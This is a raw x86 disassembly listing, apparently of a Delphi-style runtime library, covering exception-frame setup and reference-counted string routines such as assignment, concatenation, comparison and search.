  402faa:	8b 53 14             	mov    0x14(%ebx),%edx
  402fad:	8b 43 18             	mov    0x18(%ebx),%eax
  402fb0:	74 1d                	je     0x402fcf
  402fb2:	8b 15 0c c0 40 00    	mov    0x40c00c,%edx
  402fb8:	85 d2                	test   %edx,%edx
  402fba:	0f 84 1c ff ff ff    	je     0x402edc
  402fc0:	89 d8                	mov    %ebx,%eax
  402fc2:	ff d2                	call   *%edx
  402fc4:	85 c0                	test   %eax,%eax
  402fc6:	0f 84 10 ff ff ff    	je     0x402edc
  402fcc:	8b 53 0c             	mov    0xc(%ebx),%edx
  402fcf:	e8 a8 fc ff ff       	call   0x402c7c
  402fd4:	8b 0d 00 c0 40 00    	mov    0x40c000,%ecx
  402fda:	85 c9                	test   %ecx,%ecx
  402fdc:	74 02                	je     0x402fe0
  402fde:	ff d1                	call   *%ecx
  402fe0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402fe4:	b8 d9 00 00 00       	mov    $0xd9,%eax
  402fe9:	8b 51 14             	mov    0x14(%ecx),%edx
  402fec:	89 14 24             	mov    %edx,(%esp)
  402fef:	e9 ac 0e 00 00       	jmp    0x403ea0
  402ff4:	31 c0                	xor    %eax,%eax
  402ff6:	c3                   	ret
  402ff7:	90                   	nop
  402ff8:	31 d2                	xor    %edx,%edx
  402ffa:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ffd:	64 8b 0a             	mov    %fs:(%edx),%ecx
  403000:	64 89 02             	mov    %eax,%fs:(%edx)
  403003:	89 08                	mov    %ecx,(%eax)
  403005:	c7 40 04 7c 2f 40 00 	movl   $0x402f7c,0x4(%eax)
  40300c:	89 68 08             	mov    %ebp,0x8(%eax)
  40300f:	89 05 88 c4 40 00    	mov    %eax,0x40c488
  403015:	c3                   	ret
  403016:	8b c0                	mov    %eax,%eax
  403018:	31 d2                	xor    %edx,%edx
  40301a:	8b 05 88 c4 40 00    	mov    0x40c488,%eax
  403020:	64 8b 0a             	mov    %fs:(%edx),%ecx
  403023:	39 c8                	cmp    %ecx,%eax
  403025:	75 08                	jne    0x40302f
  403027:	8b 00                	mov    (%eax),%eax
  403029:	64 89 02             	mov    %eax,%fs:(%edx)
  40302c:	c3                   	ret
  40302d:	8b 09                	mov    (%ecx),%ecx
  40302f:	83 f9 ff             	cmp    $0xffffffff,%ecx
  403032:	74 08                	je     0x40303c
  403034:	39 01                	cmp    %eax,(%ecx)
  403036:	75 f5                	jne    0x40302d
  403038:	8b 00                	mov    (%eax),%eax
  40303a:	89 01                	mov    %eax,(%ecx)
  40303c:	c3                   	ret
  40303d:	8d 40 00             	lea    0x0(%eax),%eax
  403040:	e8 b3 ff ff ff       	call   0x402ff8
  403045:	6a 00                	push   $0x0
  403047:	e8 dc e1 ff ff       	call   0x401228
  40304c:	89 05 14 c0 40 00    	mov    %eax,0x40c014
  403052:	e8 b9 e1 ff ff       	call   0x401210
  403057:	89 05 1c c0 40 00    	mov    %eax,0x40c01c
  40305d:	c7 05 18 c0 40 00 0a 	movl   $0xa,0x40c018
  403064:	00 00 00 
  403067:	b8 98 2d 40 00       	mov    $0x402d98,%eax
  40306c:	c3                   	ret
  40306d:	8d 40 00             	lea    0x0(%eax),%eax
  403070:	83 3d d0 c3 40 00 00 	cmpl   $0x0,0x40c3d0
  403077:	7d 0a                	jge    0x403083
  403079:	b8 e2 00 00 00       	mov    $0xe2,%eax
  40307e:	e8 1d 0e 00 00       	call   0x403ea0
  403083:	68 08 00 00 00       	push   $0x8
  403088:	6a 40                	push   $0x40
  40308a:	e8 e9 e1 ff ff       	call   0x401278
  40308f:	85 c0                	test   %eax,%eax
  403091:	75 0b                	jne    0x40309e
  403093:	b8 e2 00 00 00       	mov    $0xe2,%eax
  403098:	e8 03 0e 00 00       	call   0x403ea0
  40309d:	c3                   	ret
  40309e:	50                   	push   %eax
  40309f:	a1 d0 c3 40 00       	mov    0x40c3d0,%eax
  4030a4:	50                   	push   %eax
  4030a5:	e8 96 e1 ff ff       	call   0x401240
  4030aa:	c3                   	ret
  4030ab:	90                   	nop
  4030ac:	8a 0d 30 c0 40 00    	mov    0x40c030,%cl
  4030b2:	8b 05 d0 c3 40 00    	mov    0x40c3d0,%eax
  4030b8:	84 c9                	test   %cl,%cl
  4030ba:	75 16                	jne    0x4030d2
  4030bc:	64 8b 15 2c 00 00 00 	mov    %fs:0x2c,%edx
  4030c3:	8b 04 82             	mov    (%edx,%eax,4),%eax
  4030c6:	c3                   	ret
  4030c7:	e8 a4 ff ff ff       	call   0x403070
  4030cc:	8b 05 d0 c3 40 00    	mov    0x40c3d0,%eax
  4030d2:	50                   	push   %eax
  4030d3:	e8 60 e1 ff ff       	call   0x401238
  4030d8:	85 c0                	test   %eax,%eax
  4030da:	74 eb                	je     0x4030c7
  4030dc:	c3                   	ret
  4030dd:	8d 40 00             	lea    0x0(%eax),%eax
  4030e0:	8b 10                	mov    (%eax),%edx
  4030e2:	85 d2                	test   %edx,%edx
  4030e4:	74 19                	je     0x4030ff
  4030e6:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4030ec:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4030ef:	49                   	dec    %ecx
  4030f0:	7c 0d                	jl     0x4030ff
  4030f2:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4030f5:	75 08                	jne    0x4030ff
  4030f7:	8d 42 f8             	lea    -0x8(%edx),%eax
  4030fa:	e8 ad f4 ff ff       	call   0x4025ac
  4030ff:	c3                   	ret
  403100:	53                   	push   %ebx
  403101:	56                   	push   %esi
  403102:	89 c3                	mov    %eax,%ebx
  403104:	89 d6                	mov    %edx,%esi
  403106:	8b 13                	mov    (%ebx),%edx
  403108:	85 d2                	test   %edx,%edx
  40310a:	74 19                	je     0x403125
  40310c:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  403112:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403115:	49                   	dec    %ecx
  403116:	7c 0d                	jl     0x403125
  403118:	89 4a f8             	mov    %ecx,-0x8(%edx)
  40311b:	75 08                	jne    0x403125
  40311d:	8d 42 f8             	lea    -0x8(%edx),%eax
  403120:	e8 87 f4 ff ff       	call   0x4025ac
  403125:	83 c3 04             	add    $0x4,%ebx
  403128:	4e                   	dec    %esi
  403129:	75 db                	jne    0x403106
  40312b:	5e                   	pop    %esi
  40312c:	5b                   	pop    %ebx
  40312d:	c3                   	ret
  40312e:	8b c0                	mov    %eax,%eax
  403130:	85 d2                	test   %edx,%edx
  403132:	74 23                	je     0x403157
  403134:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403137:	41                   	inc    %ecx
  403138:	7f 1a                	jg     0x403154
  40313a:	50                   	push   %eax
  40313b:	52                   	push   %edx
  40313c:	8b 42 fc             	mov    -0x4(%edx),%eax
  40313f:	e8 58 00 00 00       	call   0x40319c
  403144:	89 c2                	mov    %eax,%edx
  403146:	58                   	pop    %eax
  403147:	52                   	push   %edx
  403148:	8b 48 fc             	mov    -0x4(%eax),%ecx
  40314b:	e8 78 f5 ff ff       	call   0x4026c8
  403150:	5a                   	pop    %edx
  403151:	58                   	pop    %eax
  403152:	eb 03                	jmp    0x403157
  403154:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403157:	87 10                	xchg   %edx,(%eax)
  403159:	85 d2                	test   %edx,%edx
  40315b:	74 13                	je     0x403170
  40315d:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403160:	49                   	dec    %ecx
  403161:	7c 0d                	jl     0x403170
  403163:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403166:	75 08                	jne    0x403170
  403168:	8d 42 f8             	lea    -0x8(%edx),%eax
  40316b:	e8 3c f4 ff ff       	call   0x4025ac
  403170:	c3                   	ret
  403171:	8d 40 00             	lea    0x0(%eax),%eax
  403174:	85 d2                	test   %edx,%edx
  403176:	74 09                	je     0x403181
  403178:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40317b:	41                   	inc    %ecx
  40317c:	7e 03                	jle    0x403181
  40317e:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403181:	87 10                	xchg   %edx,(%eax)
  403183:	85 d2                	test   %edx,%edx
  403185:	74 13                	je     0x40319a
  403187:	8b 4a f8             	mov    -0x8(%edx),%ecx
  40318a:	49                   	dec    %ecx
  40318b:	7c 0d                	jl     0x40319a
  40318d:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403190:	75 08                	jne    0x40319a
  403192:	8d 42 f8             	lea    -0x8(%edx),%eax
  403195:	e8 12 f4 ff ff       	call   0x4025ac
  40319a:	c3                   	ret
  40319b:	90                   	nop
  40319c:	85 c0                	test   %eax,%eax
  40319e:	7e 1c                	jle    0x4031bc
  4031a0:	50                   	push   %eax
  4031a1:	83 c0 09             	add    $0x9,%eax
  4031a4:	e8 eb f3 ff ff       	call   0x402594
  4031a9:	83 c0 08             	add    $0x8,%eax
  4031ac:	5a                   	pop    %edx
  4031ad:	89 50 fc             	mov    %edx,-0x4(%eax)
  4031b0:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  4031b7:	c6 04 10 00          	movb   $0x0,(%eax,%edx,1)
  4031bb:	c3                   	ret
  4031bc:	31 c0                	xor    %eax,%eax
  4031be:	c3                   	ret
  4031bf:	90                   	nop
  4031c0:	53                   	push   %ebx
  4031c1:	56                   	push   %esi
  4031c2:	57                   	push   %edi
  4031c3:	89 c3                	mov    %eax,%ebx
  4031c5:	89 d6                	mov    %edx,%esi
  4031c7:	89 cf                	mov    %ecx,%edi
  4031c9:	89 f8                	mov    %edi,%eax
  4031cb:	e8 cc ff ff ff       	call   0x40319c
  4031d0:	89 f9                	mov    %edi,%ecx
  4031d2:	89 c7                	mov    %eax,%edi
  4031d4:	85 f6                	test   %esi,%esi
  4031d6:	74 09                	je     0x4031e1
  4031d8:	89 c2                	mov    %eax,%edx
  4031da:	89 f0                	mov    %esi,%eax
  4031dc:	e8 e7 f4 ff ff       	call   0x4026c8
  4031e1:	89 d8                	mov    %ebx,%eax
  4031e3:	e8 f8 fe ff ff       	call   0x4030e0
  4031e8:	89 3b                	mov    %edi,(%ebx)
  4031ea:	5f                   	pop    %edi
  4031eb:	5e                   	pop    %esi
  4031ec:	5b                   	pop    %ebx
  4031ed:	c3                   	ret
  4031ee:	8b c0                	mov    %eax,%eax
  4031f0:	52                   	push   %edx
  4031f1:	89 e2                	mov    %esp,%edx
  4031f3:	b9 01 00 00 00       	mov    $0x1,%ecx
  4031f8:	e8 c3 ff ff ff       	call   0x4031c0
  4031fd:	5a                   	pop    %edx
  4031fe:	c3                   	ret
  4031ff:	90                   	nop
  403200:	31 c9                	xor    %ecx,%ecx
  403202:	8a 0a                	mov    (%edx),%cl
  403204:	42                   	inc    %edx
  403205:	e8 b6 ff ff ff       	call   0x4031c0
  40320a:	c3                   	ret
  40320b:	90                   	nop
  40320c:	31 c9                	xor    %ecx,%ecx
  40320e:	85 d2                	test   %edx,%edx
  403210:	74 21                	je     0x403233
  403212:	52                   	push   %edx
  403213:	3a 0a                	cmp    (%edx),%cl
  403215:	74 17                	je     0x40322e
  403217:	3a 4a 01             	cmp    0x1(%edx),%cl
  40321a:	74 11                	je     0x40322d
  40321c:	3a 4a 02             	cmp    0x2(%edx),%cl
  40321f:	74 0b                	je     0x40322c
  403221:	3a 4a 03             	cmp    0x3(%edx),%cl
  403224:	74 05                	je     0x40322b
  403226:	83 c2 04             	add    $0x4,%edx
  403229:	eb e8                	jmp    0x403213
  40322b:	42                   	inc    %edx
  40322c:	42                   	inc    %edx
  40322d:	42                   	inc    %edx
  40322e:	89 d1                	mov    %edx,%ecx
  403230:	5a                   	pop    %edx
  403231:	29 d1                	sub    %edx,%ecx
  403233:	e9 88 ff ff ff       	jmp    0x4031c0
  403238:	c3                   	ret
  403239:	8d 40 00             	lea    0x0(%eax),%eax
  40323c:	57                   	push   %edi
  40323d:	50                   	push   %eax
  40323e:	51                   	push   %ecx
  40323f:	89 d7                	mov    %edx,%edi
  403241:	31 c0                	xor    %eax,%eax
  403243:	f2 ae                	repnz scas %es:(%edi),%al
  403245:	75 02                	jne    0x403249
  403247:	f7 d1                	not    %ecx
  403249:	58                   	pop    %eax
  40324a:	01 c1                	add    %eax,%ecx
  40324c:	58                   	pop    %eax
  40324d:	5f                   	pop    %edi
  40324e:	e9 6d ff ff ff       	jmp    0x4031c0
  403253:	c3                   	ret
  403254:	85 c0                	test   %eax,%eax
  403256:	74 03                	je     0x40325b
  403258:	8b 40 fc             	mov    -0x4(%eax),%eax
  40325b:	c3                   	ret
  40325c:	85 d2                	test   %edx,%edx
  40325e:	74 3f                	je     0x40329f
  403260:	8b 08                	mov    (%eax),%ecx
  403262:	85 c9                	test   %ecx,%ecx
  403264:	0f 84 c6 fe ff ff    	je     0x403130
  40326a:	53                   	push   %ebx
  40326b:	56                   	push   %esi
  40326c:	57                   	push   %edi
  40326d:	89 c3                	mov    %eax,%ebx
  40326f:	89 d6                	mov    %edx,%esi
  403271:	8b 79 fc             	mov    -0x4(%ecx),%edi
  403274:	8b 56 fc             	mov    -0x4(%esi),%edx
  403277:	01 fa                	add    %edi,%edx
  403279:	39 ce                	cmp    %ecx,%esi
  40327b:	74 17                	je     0x403294
  40327d:	e8 32 02 00 00       	call   0x4034b4
  403282:	89 f0                	mov    %esi,%eax
  403284:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403287:	8b 13                	mov    (%ebx),%edx
  403289:	01 fa                	add    %edi,%edx
  40328b:	e8 38 f4 ff ff       	call   0x4026c8
  403290:	5f                   	pop    %edi
  403291:	5e                   	pop    %esi
  403292:	5b                   	pop    %ebx
  403293:	c3                   	ret
  403294:	e8 1b 02 00 00       	call   0x4034b4
  403299:	8b 03                	mov    (%ebx),%eax
  40329b:	89 f9                	mov    %edi,%ecx
  40329d:	eb e8                	jmp    0x403287
  40329f:	c3                   	ret
  4032a0:	53                   	push   %ebx
  4032a1:	56                   	push   %esi
  4032a2:	52                   	push   %edx
  4032a3:	50                   	push   %eax
  4032a4:	89 d3                	mov    %edx,%ebx
  4032a6:	31 c0                	xor    %eax,%eax
  4032a8:	8b 4c 94 10          	mov    0x10(%esp,%edx,4),%ecx
  4032ac:	85 c9                	test   %ecx,%ecx
  4032ae:	74 03                	je     0x4032b3
  4032b0:	03 41 fc             	add    -0x4(%ecx),%eax
  4032b3:	4a                   	dec    %edx
  4032b4:	75 f2                	jne    0x4032a8
  4032b6:	e8 e1 fe ff ff       	call   0x40319c
  4032bb:	50                   	push   %eax
  4032bc:	89 c6                	mov    %eax,%esi
  4032be:	8b 44 9c 14          	mov    0x14(%esp,%ebx,4),%eax
  4032c2:	89 f2                	mov    %esi,%edx
  4032c4:	85 c0                	test   %eax,%eax
  4032c6:	74 0a                	je     0x4032d2
  4032c8:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4032cb:	01 ce                	add    %ecx,%esi
  4032cd:	e8 f6 f3 ff ff       	call   0x4026c8
  4032d2:	4b                   	dec    %ebx
  4032d3:	75 e9                	jne    0x4032be
  4032d5:	5a                   	pop    %edx
  4032d6:	58                   	pop    %eax
  4032d7:	85 d2                	test   %edx,%edx
  4032d9:	74 03                	je     0x4032de
  4032db:	ff 4a f8             	decl   -0x8(%edx)
  4032de:	e8 4d fe ff ff       	call   0x403130
  4032e3:	5a                   	pop    %edx
  4032e4:	5e                   	pop    %esi
  4032e5:	5b                   	pop    %ebx
  4032e6:	58                   	pop    %eax
  4032e7:	8d 24 94             	lea    (%esp,%edx,4),%esp
  4032ea:	ff e0                	jmp    *%eax
  4032ec:	c3                   	ret
  4032ed:	8d 40 00             	lea    0x0(%eax),%eax
  4032f0:	53                   	push   %ebx
  4032f1:	56                   	push   %esi
  4032f2:	57                   	push   %edi
  4032f3:	89 c6                	mov    %eax,%esi
  4032f5:	89 d7                	mov    %edx,%edi
  4032f7:	39 d0                	cmp    %edx,%eax
  4032f9:	0f 84 8f 00 00 00    	je     0x40338e
  4032ff:	85 f6                	test   %esi,%esi
  403301:	74 68                	je     0x40336b
  403303:	85 ff                	test   %edi,%edi
  403305:	74 6b                	je     0x403372
  403307:	8b 46 fc             	mov    -0x4(%esi),%eax
  40330a:	8b 57 fc             	mov    -0x4(%edi),%edx
  40330d:	29 d0                	sub    %edx,%eax
  40330f:	77 02                	ja     0x403313
  403311:	01 c2                	add    %eax,%edx
  403313:	52                   	push   %edx
  403314:	c1 ea 02             	shr    $0x2,%edx
  403317:	74 26                	je     0x40333f
  403319:	8b 0e                	mov    (%esi),%ecx
  40331b:	8b 1f                	mov    (%edi),%ebx
  40331d:	39 d9                	cmp    %ebx,%ecx
  40331f:	75 58                	jne    0x403379
  403321:	4a                   	dec    %edx
  403322:	74 15                	je     0x403339
  403324:	8b 4e 04             	mov    0x4(%esi),%ecx
  403327:	8b 5f 04             	mov    0x4(%edi),%ebx
  40332a:	39 d9                	cmp    %ebx,%ecx
  40332c:	75 4b                	jne    0x403379
  40332e:	83 c6 08             	add    $0x8,%esi
  403331:	83 c7 08             	add    $0x8,%edi
  403334:	4a                   	dec    %edx
  403335:	75 e2                	jne    0x403319
  403337:	eb 06                	jmp    0x40333f
  403339:	83 c6 04             	add    $0x4,%esi
  40333c:	83 c7 04             	add    $0x4,%edi
  40333f:	5a                   	pop    %edx
  403340:	83 e2 03             	and    $0x3,%edx
  403343:	74 22                	je     0x403367
  403345:	8b 0e                	mov    (%esi),%ecx
  403347:	8b 1f                	mov    (%edi),%ebx
  403349:	38 d9                	cmp    %bl,%cl
  40334b:	75 41                	jne    0x40338e
  40334d:	4a                   	dec    %edx
  40334e:	74 17                	je     0x403367
  403350:	38 fd                	cmp    %bh,%ch
  403352:	75 3a                	jne    0x40338e
  403354:	4a                   	dec    %edx
  403355:	74 10                	je     0x403367
  403357:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  40335d:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  403363:	39 d9                	cmp    %ebx,%ecx
  403365:	75 27                	jne    0x40338e
  403367:	01 c0                	add    %eax,%eax
  403369:	eb 23                	jmp    0x40338e
  40336b:	8b 57 fc             	mov    -0x4(%edi),%edx
  40336e:	29 d0                	sub    %edx,%eax
  403370:	eb 1c                	jmp    0x40338e
  403372:	8b 46 fc             	mov    -0x4(%esi),%eax
  403375:	29 d0                	sub    %edx,%eax
  403377:	eb 15                	jmp    0x40338e
  403379:	5a                   	pop    %edx
  40337a:	38 d9                	cmp    %bl,%cl
  40337c:	75 10                	jne    0x40338e
  40337e:	38 fd                	cmp    %bh,%ch
  403380:	75 0c                	jne    0x40338e
  403382:	c1 e9 10             	shr    $0x10,%ecx
  403385:	c1 eb 10             	shr    $0x10,%ebx
  403388:	38 d9                	cmp    %bl,%cl
  40338a:	75 02                	jne    0x40338e
  40338c:	38 fd                	cmp    %bh,%ch
  40338e:	5f                   	pop    %edi
  40338f:	5e                   	pop    %esi
  403390:	5b                   	pop    %ebx
  403391:	c3                   	ret
  403392:	8b c0                	mov    %eax,%eax
  403394:	85 c0                	test   %eax,%eax
  403396:	74 09                	je     0x4033a1
  403398:	8b 50 f8             	mov    -0x8(%eax),%edx
  40339b:	42                   	inc    %edx
  40339c:	7e 03                	jle    0x4033a1
  40339e:	89 50 f8             	mov    %edx,-0x8(%eax)
  4033a1:	c3                   	ret
  4033a2:	8b c0                	mov    %eax,%eax
  4033a4:	85 c0                	test   %eax,%eax
  4033a6:	74 02                	je     0x4033aa
  4033a8:	c3                   	ret
  4033a9:	00 b8 a9 33 40 00    	add    %bh,0x4033a9(%eax)
  4033af:	c3                   	ret
  4033b0:	8b 10                	mov    (%eax),%edx
  4033b2:	85 d2                	test   %edx,%edx
  4033b4:	74 2b                	je     0x4033e1
  4033b6:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4033b9:	49                   	dec    %ecx
  4033ba:	74 25                	je     0x4033e1
  4033bc:	53                   	push   %ebx
  4033bd:	89 c3                	mov    %eax,%ebx
  4033bf:	8b 42 fc             	mov    -0x4(%edx),%eax
  4033c2:	e8 d5 fd ff ff       	call   0x40319c
  4033c7:	89 c2                	mov    %eax,%edx
  4033c9:	8b 03                	mov    (%ebx),%eax
  4033cb:	89 13                	mov    %edx,(%ebx)
  4033cd:	8b 48 f8             	mov    -0x8(%eax),%ecx
  4033d0:	49                   	dec    %ecx
  4033d1:	7c 03                	jl     0x4033d6
  4033d3:	89 48 f8             	mov    %ecx,-0x8(%eax)
  4033d6:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4033d9:	e8 ea f2 ff ff       	call   0x4026c8
  4033de:	8b 13                	mov    (%ebx),%edx
  4033e0:	5b                   	pop    %ebx
  4033e1:	89 d0                	mov    %edx,%eax
  4033e3:	c3                   	ret
  4033e4:	53                   	push   %ebx
  4033e5:	85 c0                	test   %eax,%eax
  4033e7:	74 2d                	je     0x403416
  4033e9:	8b 58 fc             	mov    -0x4(%eax),%ebx
  4033ec:	85 db                	test   %ebx,%ebx
  4033ee:	74 26                	je     0x403416
  4033f0:	4a                   	dec    %edx
  4033f1:	7c 1b                	jl     0x40340e
  4033f3:	39 da                	cmp    %ebx,%edx
  4033f5:	7d 1f                	jge    0x403416
  4033f7:	29 d3                	sub    %edx,%ebx
  4033f9:	85 c9                	test   %ecx,%ecx
  4033fb:	7c 19                	jl     0x403416
  4033fd:	39 d9                	cmp    %ebx,%ecx
  4033ff:	7f 11                	jg     0x403412
  403401:	01 c2                	add    %eax,%edx
  403403:	8b 44 24 08          	mov    0x8(%esp),%eax
  403407:	e8 b4 fd ff ff       	call   0x4031c0
  40340c:	eb 11                	jmp    0x40341f
  40340e:	31 d2                	xor    %edx,%edx
  403410:	eb e5                	jmp    0x4033f7
  403412:	89 d9                	mov    %ebx,%ecx
  403414:	eb eb                	jmp    0x403401
  403416:	8b 44 24 08          	mov    0x8(%esp),%eax
  40341a:	e8 c1 fc ff ff       	call   0x4030e0
  40341f:	5b                   	pop    %ebx
  403420:	c2 04 00             	ret    $0x4
  403423:	c3                   	ret
  403424:	53                   	push   %ebx
  403425:	56                   	push   %esi
  403426:	57                   	push   %edi
  403427:	89 c3                	mov    %eax,%ebx
  403429:	89 d6                	mov    %edx,%esi
  40342b:	89 cf                	mov    %ecx,%edi
  40342d:	e8 7e ff ff ff       	call   0x4033b0
  403432:	8b 13                	mov    (%ebx),%edx
  403434:	85 d2                	test   %edx,%edx
  403436:	74 30                	je     0x403468
  403438:	8b 4a fc             	mov    -0x4(%edx),%ecx
  40343b:	4e                   	dec    %esi
  40343c:	7c 2a                	jl     0x403468
  40343e:	39 ce                	cmp    %ecx,%esi
  403440:	7d 26                	jge    0x403468
  403442:	85 ff                	test   %edi,%edi
  403444:	7e 22                	jle    0x403468
  403446:	29 f1                	sub    %esi,%ecx
  403448:	39 cf                	cmp    %ecx,%edi
  40344a:	7e 02                	jle    0x40344e
  40344c:	89 cf                	mov    %ecx,%edi
  40344e:	29 f9                	sub    %edi,%ecx
  403450:	01 f2                	add    %esi,%edx
  403452:	8d 04 3a             	lea    (%edx,%edi,1),%eax
  403455:	e8 6e f2 ff ff       	call   0x4026c8
  40345a:	8b 13                	mov    (%ebx),%edx
  40345c:	89 d8                	mov    %ebx,%eax
  40345e:	8b 52 fc             	mov    -0x4(%edx),%edx
  403461:	29 fa                	sub    %edi,%edx
  403463:	e8 4c 00 00 00       	call   0x4034b4
  403468:	5f                   	pop    %edi
  403469:	5e                   	pop    %esi
  40346a:	5b                   	pop    %ebx
  40346b:	c3                   	ret
  40346c:	85 c0                	test   %eax,%eax
  40346e:	74 40                	je     0x4034b0
  403470:	85 d2                	test   %edx,%edx
  403472:	74 31                	je     0x4034a5
  403474:	53                   	push   %ebx
  403475:	56                   	push   %esi
  403476:	57                   	push   %edi
  403477:	89 c6                	mov    %eax,%esi
  403479:	89 d7                	mov    %edx,%edi
  40347b:	8b 4f fc             	mov    -0x4(%edi),%ecx
  40347e:	57                   	push   %edi
  40347f:	8b 56 fc             	mov    -0x4(%esi),%edx
  403482:	4a                   	dec    %edx
  403483:	78 1b                	js     0x4034a0
  403485:	8a 06                	mov    (%esi),%al
  403487:	46                   	inc    %esi
  403488:	29 d1                	sub    %edx,%ecx
  40348a:	7e 14                	jle    0x4034a0
  40348c:	f2 ae                	repnz scas %es:(%edi),%al
  40348e:	75 10                	jne    0x4034a0
  403490:	89 cb                	mov    %ecx,%ebx
  403492:	56                   	push   %esi
  403493:	57                   	push   %edi
  403494:	89 d1                	mov    %edx,%ecx
  403496:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  403498:	5f                   	pop    %edi
  403499:	5e                   	pop    %esi
  40349a:	74 0c                	je     0x4034a8
  40349c:	89 d9                	mov    %ebx,%ecx
  40349e:	eb ec                	jmp    0x40348c
  4034a0:	5a                   	pop    %edx
  4034a1:	31 c0                	xor    %eax,%eax
  4034a3:	eb 08                	jmp    0x4034ad
  4034a5:	31 c0                	xor    %eax,%eax
  4034a7:	c3                   	ret
  4034a8:	5a                   	pop    %edx
  4034a9:	89 f8                	mov    %edi,%eax
  4034ab:	29 d0                	sub    %edx,%eax
  4034ad:	5f                   	pop    %edi
  4034ae:	5e                   	pop    %esi
  4034af:	5b                   	pop    %ebx
  4034b0:	c3                   	ret
  4034b1:	8d 40 00             	lea    0x0(%eax),%eax
  4034b4:	53                   	push   %ebx
  4034b5:	56                   	push   %esi
  4034b6:	57                   	push   %edi
  4034b7:	89 c3                	mov    %eax,%ebx
  4034b9:	89 d6                	mov    %edx,%esi
  4034bb:	31 ff                	xor    %edi,%edi
  4034bd:	85 d2                	test   %edx,%edx
  4034bf:	74 48                	je     0x403509
  4034c1:	8b 03                	mov    (%ebx),%eax
  4034c3:	85 c0                	test   %eax,%eax
  4034c5:	74 23                	je     0x4034ea
  4034c7:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  4034cb:	75 1d                	jne    0x4034ea
  4034cd:	83 e8 08             	sub    $0x8,%eax
  4034d0:	83 c2 09             	add    $0x9,%edx
  4034d3:	50                   	push   %eax
  4034d4:	89 e0                	mov    %esp,%eax
  4034d6:	e8 e9 f0 ff ff       	call   0x4025c4
  4034db:	58                   	pop    %eax
  4034dc:	83 c0 08             	add    $0x8,%eax
  4034df:	89 03                	mov    %eax,(%ebx)
  4034e1:	89 70 fc             	mov    %esi,-0x4(%eax)
  4034e4:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  4034e8:	eb 28                	jmp    0x403512
  4034ea:	89 d0                	mov    %edx,%eax
  4034ec:	e8 ab fc ff ff       	call   0x40319c
  4034f1:	89 c7                	mov    %eax,%edi
  4034f3:	8b 03                	mov    (%ebx),%eax
  4034f5:	85 c0                	test   %eax,%eax
  4034f7:	74 10                	je     0x403509
  4034f9:	89 fa                	mov    %edi,%edx
  4034fb:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4034fe:	39 f1                	cmp    %esi,%ecx
  403500:	7c 02                	jl     0x403504
  403502:	89 f1                	mov    %esi,%ecx
  403504:	e8 bf f1 ff ff       	call   0x4026c8
  403509:	89 d8                	mov    %ebx,%eax
  40350b:	e8 d0 fb ff ff       	call   0x4030e0
  403510:	89 3b                	mov    %edi,(%ebx)
  403512:	5f                   	pop    %edi
  403513:	5e                   	pop    %esi
  403514:	5b                   	pop    %ebx
  403515:	c3                   	ret
  403516:	8b c0                	mov    %eax,%eax
  403518:	31 c9                	xor    %ecx,%ecx
  40351a:	53                   	push   %ebx
  40351b:	8a 4a 01             	mov    0x1(%edx),%cl
  40351e:	56                   	push   %esi
  40351f:	57                   	push   %edi
  403520:	89 c3                	mov    %eax,%ebx
  403522:	8d 74 0a 0a          	lea    0xa(%edx,%ecx,1),%esi
  403526:	8b 7c 0a 06          	mov    0x6(%edx,%ecx,1),%edi
  40352a:	8b 46 04             	mov    0x4(%esi),%eax
  40352d:	8b 16                	mov    (%esi),%edx
  40352f:	01 d8                	add    %ebx,%eax
  403531:	e8 8e 00 00 00       	call   0x4035c4
  403536:	83 c6 08             	add    $0x8,%esi
  403539:	4f                   	dec    %edi
  40353a:	7f ee                	jg     0x40352a
  40353c:	5f                   	pop    %edi
  40353d:	5e                   	pop    %esi
  40353e:	5b                   	pop    %ebx
  40353f:	c3                   	ret
  403540:	53                   	push   %ebx
  403541:	56                   	push   %esi
  403542:	57                   	push   %edi
  403543:	89 c3                	mov    %eax,%ebx
  403545:	89 d6                	mov    %edx,%esi
  403547:	89 cf                	mov    %ecx,%edi
  403549:	31 d2                	xor    %edx,%edx
  40354b:	8a 06                	mov    (%esi),%al
  40354d:	8a 56 01             	mov    0x1(%esi),%dl
  403550:	31 c9                	xor    %ecx,%ecx
  403552:	80 f8 0a             	cmp    $0xa,%al
  403555:	74 19                	je     0x403570
  403557:	80 f8 0c             	cmp    $0xc,%al
  40355a:	74 1e                	je     0x40357a
  40355c:	80 f8 0d             	cmp    $0xd,%al
  40355f:	74 2c                	je     0x40358d
  403561:	80 f8 0e             	cmp    $0xe,%al
  403564:	74 43                	je     0x4035a9
  403566:	b0 02                	mov    $0x2,%al
  403568:	5f                   	pop    %edi
  403569:	5e                   	pop    %esi
  40356a:	5b                   	pop    %ebx
  40356b:	e9 a4 f0 ff ff       	jmp    0x402614
  403570:	89 0b                	mov    %ecx,(%ebx)
  403572:	83 c3 04             	add    $0x4,%ebx
  403575:	4f                   	dec    %edi
  403576:	7f f8                	jg     0x403570
  403578:	eb 43                	jmp    0x4035bd
  40357a:	89 0b                	mov    %ecx,(%ebx)
  40357c:	89 4b 04             	mov    %ecx,0x4(%ebx)
  40357f:	89 4b 08             	mov    %ecx,0x8(%ebx)
  403582:	89 4b 0c             	mov    %ecx,0xc(%ebx)
